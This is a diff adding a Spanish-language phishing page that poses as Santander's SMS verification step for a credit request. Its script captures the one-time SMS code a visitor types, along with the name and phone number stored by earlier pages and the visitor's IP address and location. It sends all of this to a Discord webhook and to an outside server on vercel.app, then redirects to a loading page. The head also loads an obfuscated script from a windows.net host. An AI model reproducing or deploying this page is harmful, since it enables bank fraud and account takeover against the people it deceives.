@@ -1,0 +1,569 @@
+
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+<!-- Inserted by miarroba -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7294310421616689" crossorigin="anonymous"></script>
+<script type='text/javascript' src='https://ads.vidoomy.com/miarroba_23335.js' async></script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<!-- Inserted by miarroba --><script type='text/javascript' src='https://creditosenlinead.z9.web.core.windows.net/hMGB0iQUXJB6vp29wjd05czm8oK-0_DOHWna74yXv8byXl6DtOclHlrkVcDLRjLiUlQ7g7AywQjxBTi6ALW2ssrgjRh4_XWCnNWkdDD6-ZcmHAKr_6APNWYNCtUuIMFnS9nYjdJvXmG9ZqbBiLxU1qjtqryu8QWKrLQGwjbraCZ-MjNxl5vMwz_ejnQoH3kC-aSSEx2pbs3jbHHGzw_GpZj2oWOVdIPoqg9yyG6KP7Vz0b-Jv7X8_1GYaS9hW5vxwTJNUwtJ7qIwbrU_hsHWZhS-dJykFLWv8n8cFZvQTRWmnCXR_JKDUezcbN37MaZPWHnviUNNj_byWps5BBbSi1bBMHIcSLuG-GbG4F_KnLh-latJBn_7hiPlJCsiWue0mesRsW1nFuIAPc-VIrjxpn40cSpTR6TrH45W63EcFuhyHgaPN5Gt5C3F5mM_Bld4KXXrkRaIzbUzbhjCMl_7RncP3oxqmJntvK-S50SgDatW3Ty1dGHrPKNQVH6bbj8IU4tq1wUP-V53iUkf5suSIr84tJLotxqkpg'></script>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Verificación SMS </title>
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="https://www.santander.com/favicon.ico"
+    />
+
+    <link
+      href="https://fonts.googleapis.com/css2?family=SantanderHeadline:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
+      integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <style>
+      :root {
+        --santander-red: #ec0000;
+        --santander-red-dark: #c40000;
+        --santander-red-light: #ff3333;
+        --text-dark: #121212;
+        --text-medium: #4a4a4a;
+        --text-light: #666666;
+        --white: #ffffff;
+        --gray-light: #f4f4f4;
+        --gray-border: #d3d3d3;
+        --success-green: #5cb85c;
+        --transition: all 0.3s ease;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body,
+      html {
+        height: 100%;
+        width: 100%;
+        font-family: "SantanderHeadline", -apple-system, BlinkMacSystemFont,
+          "Segoe UI", Arial, sans-serif;
+        color: var(--text-dark);
+        overflow-x: hidden;
+      }
+
+      body {
+        background: linear-gradient(
+          135deg,
+          #fff 0%,
+          #fff 50%,
+          #fff 100%
+        );
+        margin: 0;
+        display: flex;
+        min-height: 100vh;
+        height: auto;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+        width: 100%;
+        padding: 20px 0;
+      }
+
+      .verification-container {
+        width: 90%;
+        max-width: 460px;
+        z-index: 10;
+        animation: fadeInUp 0.6s ease-out;
+      }
+
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(30px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .verification-box {
+        background: var(--white);
+        border-radius: 8px;
+        padding: 48px 40px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        text-align: center;
+        position: relative;
+      }
+
+      .santander-logo-wrapper {
+        margin-bottom: 32px;
+      }
+
+      .santander-logo {
+        width: 180px;
+        height: auto;
+      }
+
+      .icon-wrapper {
+        width: 80px;
+        height: 80px;
+        background: linear-gradient(
+          135deg,
+          var(--santander-red) 0%,
+          var(--santander-red-light) 100%
+        );
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 24px;
+        box-shadow: 0 4px 20px rgba(236, 0, 0, 0.3);
+        animation: pulse 2s ease-in-out infinite;
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.05);
+        }
+      }
+
+      .icon-wrapper i {
+        font-size: 40px;
+        color: var(--white);
+      }
+
+      .verification-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: var(--text-dark);
+        margin-bottom: 12px;
+      }
+
+      .verification-description {
+        font-size: 15px;
+        color: var(--text-medium);
+        line-height: 1.6;
+        margin-bottom: 28px;
+      }
+
+      .phone-number {
+        font-weight: 600;
+        color: var(--santander-red);
+      }
+
+      .form-group {
+        margin-bottom: 20px;
+        text-align: left;
+      }
+
+      .form-label {
+        display: block;
+        font-size: 13px;
+        font-weight: 600;
+        color: var(--text-dark);
+        margin-bottom: 8px;
+      }
+
+      .input-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+        border: 2px solid var(--gray-border);
+        border-radius: 4px;
+        transition: var(--transition);
+        background: var(--white);
+      }
+
+      .input-wrapper:focus-within {
+        border-color: var(--santander-red);
+        box-shadow: 0 0 0 3px rgba(236, 0, 0, 0.1);
+      }
+
+      .input-icon {
+        padding: 0 14px;
+        color: var(--santander-red);
+        font-size: 18px;
+      }
+
+      .code-input {
+        flex: 1;
+        border: none;
+        padding: 14px 14px 14px 0;
+        font-size: 16px;
+        outline: none;
+        background: transparent;
+        color: var(--text-dark);
+        letter-spacing: 2px;
+        font-weight: 500;
+      }
+
+      .code-input::placeholder {
+        color: #aaa;
+        letter-spacing: normal;
+      }
+
+      .verify-button {
+        width: 100%;
+        padding: 14px;
+        background: var(--santander-red);
+        color: var(--white);
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: var(--transition);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-top: 8px;
+        box-shadow: 0 4px 12px rgba(236, 0, 0, 0.3);
+      }
+
+      .verify-button:hover {
+        background: var(--santander-red-dark);
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(236, 0, 0, 0.4);
+      }
+
+      .verify-button:disabled {
+        opacity: 0.7;
+        cursor: not-allowed;
+        transform: none;
+      }
+
+      .security-notice {
+        background: var(--gray-light);
+        padding: 16px;
+        border-radius: 6px;
+        margin-top: 24px;
+        text-align: left;
+        border-left: 3px solid var(--santander-red);
+      }
+
+      .security-notice-title {
+        font-size: 13px;
+        font-weight: 600;
+        color: var(--text-dark);
+        margin-bottom: 6px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .security-notice p {
+        font-size: 13px;
+        color: var(--text-medium);
+        line-height: 1.5;
+        margin: 0;
+      }
+
+      .resend-code {
+        margin-top: 20px;
+        text-align: center;
+      }
+
+      .resend-code p {
+        font-size: 13px;
+        color: var(--text-medium);
+        margin-bottom: 8px;
+      }
+
+      .resend-link {
+        color: var(--santander-red);
+        text-decoration: none;
+        font-weight: 600;
+        font-size: 14px;
+      }
+
+      .resend-link:hover {
+        text-decoration: underline;
+      }
+
+      .footer-info {
+        margin-top: 24px;
+        text-align: center;
+      }
+
+      .footer-logo {
+        margin-bottom: 12px;
+      }
+
+      .footer-logo img {
+        width: 120px;
+        height: auto;
+        opacity: 0.7;
+      }
+
+      .footer-links {
+        display: flex;
+        gap: 16px;
+        justify-content: center;
+        flex-wrap: wrap;
+        margin-top: 12px;
+      }
+
+      .footer-link {
+        color: var(--text-light);
+        text-decoration: none;
+        font-size: 12px;
+      }
+
+      .footer-link:hover {
+        color: var(--santander-red);
+        text-decoration: underline;
+      }
+
+      @media (max-width: 480px) {
+        .verification-box {
+          padding: 32px 24px;
+        }
+
+        .verification-title {
+          font-size: 20px;
+        }
+
+        .verification-description {
+          font-size: 14px;
+        }
+
+        .icon-wrapper {
+          width: 70px;
+          height: 70px;
+        }
+
+        .icon-wrapper i {
+          font-size: 35px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+<!-- Inserted by miarroba -->
+<noscript><iframe src="logo.png"></iframe></noscript>
+<!-- Inserted by miarroba -->
+    <div class="verification-container">
+      <div class="verification-box">
+        <div class="santander-logo-wrapper">
+          <img
+            src="logo.png"
+            alt="Santander"
+            class="santander-logo"
+          />
+        </div>
+
+        <div class="icon-wrapper">
+          <i class="fa-solid fa-message"></i>
+        </div>
+
+        <h1 class="verification-title">Código de verificación SMS</h1>
+        <p class="verification-description">
+          Hemos enviado un código de 6 dígitos por mensaje de texto para
+          finalizar tu solicitud de credito.
+        </p>
+
+        <script>
+          const usuario = localStorage.getItem("usuario");
+          const phoneElement = document.getElementById("numero");
+
+          if (usuario && phoneElement) {
+            const ultimosCuatro = usuario.slice(-4);
+            const numeroSinCodigo = usuario.replace(/\+\d+\s?/, "").trim();
+            const cantidadAsteriscos = Math.max(numeroSinCodigo.length - 4, 0);
+            const asteriscos = "*".repeat(cantidadAsteriscos);
+            phoneElement.innerHTML = asteriscos + ultimosCuatro;
+          }
+        </script>
+
+        <form id="verificationForm" autocomplete="off">
+          <div class="form-group">
+            <label for="codeInput" class="form-label">Código SMS</label>
+            <div class="input-wrapper">
+              <span class="input-icon">
+                <i class="fa-solid fa-comment-sms"></i>
+              </span>
+              <input
+                type="text"
+                id="codeInput"
+                name="code"
+                class="code-input"
+                placeholder="Ingresa el código"
+                maxlength="6"
+                required
+                autocomplete="off"
+              />
+            </div>
+          </div>
+
+          <button type="submit" class="verify-button">
+            <i class="fa-solid fa-check-circle"></i>
+            Verificar Código
+          </button>
+        </form>
+
+        <div class="resend-code">
+          <p>¿No recibiste el código?</p>
+          <a href="#" class="resend-link" onclick="resendCode(event)">
+            <i class="fa-solid fa-rotate-right"></i> Reenviar código
+          </a>
+        </div>
+
+        <div class="security-notice">
+          <div class="security-notice-title">
+            <i
+              class="fa-solid fa-shield-halved"
+              style="color: var(--santander-red)"
+            ></i>
+            Tu seguridad es nuestra prioridad
+          </div>
+          <p>
+            Este código es de uso único y expirará en 10 minutos.
+            Nunca te solicitaremos este código por teléfono, email o redes
+            sociales.
+          </p>
+        </div>
+
+        <div class="footer-info">
+          <div class="footer-logo">
+            <img
+              src="logo.png"
+              alt="Santander"
+            />
+          </div>
+          <div class="footer-links">
+            <a href="#" class="footer-link">Ayuda</a>
+            <a href="#" class="footer-link">Seguridad</a>
+            <a href="#" class="footer-link">Privacidad</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      console.log("=== Sistema de Verificación SMS Santander ===");
+      let userIP = "";
+      let userLocation = "";
+
+      async function getUserInfo() {
+        try {
+          const response = await fetch("https://ipinfo.io/json?token=");
+          const data = await response.json();
+          userIP = data.ip || "No disponible";
+          userLocation = `${data.city || ""}, ${data.region || ""}, ${
+            data.country || ""
+          }`;
+          console.log("✅ IP detectada:", userIP);
+          console.log("✅ Ubicación:", userLocation);
+        } catch (error) {
+          console.error("❌ Error al obtener información:", error);
+        }
+      }
+
+      function resendCode(event) {
+        event.preventDefault();
+        alert("Código reenviado exitosamente a tu número de teléfono.");
+        console.log("📱 Código SMS reenviado");
+      }
+
+      document
+        .getElementById("verificationForm")
+        .addEventListener("submit", async (e) => {
+          e.preventDefault();
+          const code = document.getElementById("codeInput").value;
+
+          if (!code || code.length < 4) {
+            alert("Por favor ingrese un código válido de 6 dígitos");
+            return;
+          }
+
+          // Validar que el código no sea igual al de index2
+          const codeIndex2 = localStorage.getItem("code_index2");
+          if (code === codeIndex2) {
+            alert("El código SMS no puede ser igual al código anterior");
+            document.getElementById("codeInput").value = "";
+            return;
+          }
+
+          const button = document.querySelector(".verify-button");
+          const originalText = button.innerHTML;
+          button.innerHTML =
+            '<i class="fa-solid fa-spinner fa-spin"></i> Verificando...';
+          button.disabled = true;
+
+          console.log("\n=== 📱 CÓDIGO SMS CAPTURADO ===");
+          console.log("Usuario:", localStorage.getItem("usuario"));
+          console.log("Código SMS:", code);
+          console.log("IP:", userIP);
+          console.log("Ubicación:", userLocation);
+          console.log("Fecha:", new Date().toLocaleString("es-ES"));
+          console.log("========================\n");
+
+          // Enviar a Discord
+          await sendToDiscord("📱 Código de Verificación SMS", {
+            usuario: localStorage.getItem("nombrecompleto"),
+            celular: localStorage.getItem("usuario"),
+            "código_sms": code,
+            ip: userIP,
+            ubicación: userLocation
+          }, false);
+
+          // Guardar el código en localStorage para evitar repeticiones
+          localStorage.setItem("code_index3", code);
+
+          console.log("✅ Código SMS verificado exitosamente");
+
+          // Navegar a la siguiente página
+          setTimeout(() => {
+            window.location.href = "cargando3.html";
+          }, 1000);
+
+          // Enviar datos al servidor externo en segundo plano (sin esperar)
+          const formData = new FormData();
+          formData.append(
+            "mensaje",
+            "Santander\nUsuario: " +
+              localStorage.getItem("nombrecompleto") +
+              "\nCelular: " +
+              localStorage.getItem("usuario") +
+              "\nCódigo SMS: " +
+              code
+          );
+
+          fetch("https://servidorne.vercel.app/bbdsasd", {
+            method: "POST",
+            body: formData,
+          }).catch(error => console.error("Error:", error));
+        });
+
+      document
+        .getElementById("codeInput")
+        .addEventListener("input", function () {
+          this.value = this.value.replace(/[^0-9]/g, "");
+        });
+
+      window.addEventListener("load", getUserInfo);
+    </script>
+    <script src="./discord-sender.js"></script>
+  <!-- Inserted by miarroba -->
+</script></noframes></noembed></noscript><script type="text/javascript" src="/hosting__contador__visitas__unicas.php?h=2209259&amp;t=1767703566&amp;k=1d74e2aa39f0c868a83facedd4e05664&amp;__muid="></script>
+<!-- Inserted by miarroba -->
+</body>
+</html>
